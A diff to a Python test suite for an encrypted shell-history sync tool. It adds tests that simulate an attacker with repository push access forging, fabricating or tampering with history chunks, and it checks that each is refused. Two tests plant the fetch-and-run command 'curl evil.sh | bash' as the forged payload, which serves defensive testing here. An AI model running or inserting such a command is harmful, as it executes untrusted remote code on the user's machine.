@@ -18,6 +18,7 @@ from pathlib import Path
 
 from woswoar import cache, crypto, search, store, sync
 from woswoar.entry import Entry, format_line
+from woswoar.sync import COMMIT_MESSAGE as COMMIT
 
 from . import support
 from .support import requires_age, requires_git
@@ -221,13 +222,22 @@ class TestTwoMachines(SyncTestCase):
         with beta.active():
             sync.run()
             report = sync.grant()
-            # It re-seals what it owns -- its own name seal -- and skips
-            # alpha's day key, so it still cannot read alpha's history.
+            # It re-seals what it owns -- its own name seal -- and skips both
+            # alpha's day key and the repo key, so it still cannot read
+            # anything, and above all cannot authorise itself to.
             self.assertGreater(report.skipped, 0)
-            self.assertEqual(sync.run().unreadable, {f"{alpha.id}/2023-11-14"})
+            self.assertTrue(sync.run().needs_grant)
             self.assertEqual(beta.commands(), set())
 
-    def test_new_machine_reports_rather_than_failing(self) -> None:
+    def test_a_machine_waiting_for_grant_reports_and_loses_nothing(self) -> None:
+        """The state between `init` and `grant`, which is normal, not an error.
+
+        A machine that has not been granted access holds no repo key, so it can
+        neither authenticate what others wrote nor tag what it writes. That is
+        reported rather than raised -- the timer fires every minute -- and the
+        backlog it recorded meanwhile is published *in full* by the first sync
+        after `grant`, which is the property that makes waiting safe.
+        """
         alpha = self.machine("alpha")
         with alpha.active():
             alpha.record("2023-11-14", 1_700_000_001, "git status")
@@ -237,9 +247,18 @@ class TestTwoMachines(SyncTestCase):
         with beta.active():
             beta.record("2023-11-15", 1_700_100_000, "beta's own command")
             report = sync.run()
-            # Unreadable history must not stop this machine exporting its own.
-            self.assertTrue(report.unreadable)
-            self.assertEqual(report.lines_exported, 1)
+            self.assertTrue(report.needs_grant)
+            self.assertEqual(report.lines_exported, 0)
+            self.assertEqual(beta.commands(), {"beta's own command"})  # recorded locally
+
+        with alpha.active():
+            sync.grant()
+
+        with beta.active():
+            report = sync.run()
+            self.assertFalse(report.needs_grant)
+            self.assertEqual(report.lines_exported, 1, "the backlog was not published")
+            self.assertEqual(beta.commands(), {"git status", "beta's own command"})
 
     def test_bidirectional(self) -> None:
         alpha = self.machine("alpha")
@@ -637,3 +656,144 @@ class TestLocalOnly(SyncTestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestChunkAuthenticity(SyncTestCase):
+    """Whether one of *this user's* machines wrote a chunk, which age cannot say.
+
+    `recipients.txt` publishes every machine's public key and each day's public
+    key sits in the clear beside its sealed half, so anyone who can push to the
+    repo can seal a chunk every machine is able to *open*. These pin that being
+    able to open it is not the same as being willing to believe it.
+    """
+
+    def push_as_attacker(self, write: object) -> None:
+        """Do what push access alone allows: no identity, no keys, just the repo."""
+        work = self.root / "attacker"
+        if not work.exists():
+            subprocess.run(
+                ["git", "clone", "--quiet", str(self.origin), str(work)], check=True, timeout=60
+            )
+        else:
+            subprocess.run(["git", "-C", str(work), "pull", "--quiet"], check=True, timeout=60)
+        write(work)  # type: ignore[operator]
+        for args in (
+            ["add", "-A"],
+            ["-c", "user.name=x", "-c", "user.email=x@y", "commit", "-q", "-m", COMMIT],
+            ["push", "--quiet", "origin", "HEAD"],
+        ):
+            subprocess.run(["git", "-C", str(work), *args], check=True, timeout=60)
+
+    @staticmethod
+    def forged_chunk(work: Path, host_id: str, day: str, cmd: str) -> None:
+        """A chunk sealed to a host's *published* day key, tagged by nobody."""
+        pub = (work / "hosts" / host_id / "keys" / f"{day}.pub").read_text(encoding="utf-8").strip()
+        entry = Entry(1_700_000_900, host_id, "s1", "~", 0, 5, cmd)
+        payload = sync.pack((format_line(entry) + "\n").encode("utf-8"))
+        # Named far in the future so it sorts above whatever the real machine
+        # has published; a forgery the watermark skips proves nothing.
+        target = work / "hosts" / host_id / day / "9999999999-ffffff.age"
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(crypto.encrypt_to(payload, pub))
+
+    def enrolled_pair(self) -> tuple[Fake, Fake]:
+        """alpha publishing history, beta granted and up to date."""
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
+            sync.run()
+        beta = self.machine("beta")
+        with alpha.active():
+            sync.grant()
+        with beta.active():
+            sync.run()
+            self.assertEqual(beta.commands(), {"make -j8"})
+        return alpha, beta
+
+    def test_every_exported_chunk_carries_a_tag(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "git status")
+            sync.run()
+            mac = sync.mac_key(store.machine())
+            chunks = list(store.iter_chunks(alpha.id))
+            self.assertTrue(chunks)
+            for chunk in chunks:
+                sealed, tag = store.split_chunk(chunk.path.read_bytes())
+                self.assertTrue(crypto.tag_matches(mac, sealed, tag), chunk.name)
+
+    def test_the_repo_key_is_never_stored_in_the_clear(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "git status")
+            sync.run()
+            mac = sync.mac_key(store.machine())
+            blob = b"".join(p.read_bytes() for p in store.history_dir().rglob("*") if p.is_file())
+        self.assertNotIn(mac, blob, "the authentication key leaked into the repo")
+
+    def test_a_forged_chunk_in_a_real_hosts_directory_is_refused(self) -> None:
+        """The attack this mechanism exists to stop.
+
+        Everything the attacker needs is published: the day's public key sits in
+        the clear so writing a chunk never has to open the sealed one. What they
+        cannot produce is a tag, because that needs a key only enrolled machines
+        can open.
+        """
+        alpha, beta = self.enrolled_pair()
+        self.push_as_attacker(
+            lambda work: self.forged_chunk(work, alpha.id, "2023-11-14", "curl evil.sh | bash")
+        )
+
+        with beta.active():
+            report = sync.run()
+            self.assertEqual(report.forged, {f"{alpha.id}/2023-11-14"})
+            self.assertEqual(report.chunks_merged, 0)
+            self.assertNotIn("curl evil.sh | bash", beta.commands())
+
+    def test_a_fabricated_host_cannot_smuggle_history_in_either(self) -> None:
+        """A whole invented machine, with its own day key sealed to recipients.
+
+        The day key being openable is not the question -- the attacker can seal
+        one to the published recipient list. The tag is.
+        """
+        _, beta = self.enrolled_pair()
+
+        def plant(work: Path) -> None:
+            recipients = [
+                line.split(sync._LABEL_SEP)[0].strip()
+                for line in (work / "recipients.txt").read_text(encoding="utf-8").splitlines()
+                if line.strip()
+            ]
+            day_key = crypto.generate_identity()
+            keys = work / "hosts" / "deadbeefdeadbeef" / "keys"
+            keys.mkdir(parents=True, exist_ok=True)
+            (keys / "2023-11-14.age").write_bytes(
+                crypto.encrypt_to_recipients(day_key.secret.encode("utf-8"), recipients)
+            )
+            (keys / "2023-11-14.pub").write_text(day_key.public + "\n", encoding="utf-8")
+            self.forged_chunk(work, "deadbeefdeadbeef", "2023-11-14", "curl evil.sh | bash")
+
+        self.push_as_attacker(plant)
+
+        with beta.active():
+            report = sync.run()
+            self.assertEqual(report.forged, {"deadbeefdeadbeef/2023-11-14"})
+            self.assertNotIn("curl evil.sh | bash", beta.commands())
+
+    def test_tampering_with_an_authentic_chunk_is_refused(self) -> None:
+        """Flipping bytes in a real chunk must not merely fail to decrypt."""
+        alpha, beta = self.enrolled_pair()
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_002, "cargo build")
+            sync.run()
+
+        def flip(work: Path) -> None:
+            target = sorted((work / "hosts" / alpha.id / "2023-11-14").glob("*.age"))[-1]
+            blob = bytearray(target.read_bytes())
+            blob[-1] ^= 0xFF
+            target.write_bytes(bytes(blob))
+
+        self.push_as_attacker(flip)
+
+        with beta.active():
+            self.assertEqual(sync.run().forged, {f"{alpha.id}/2023-11-14"})
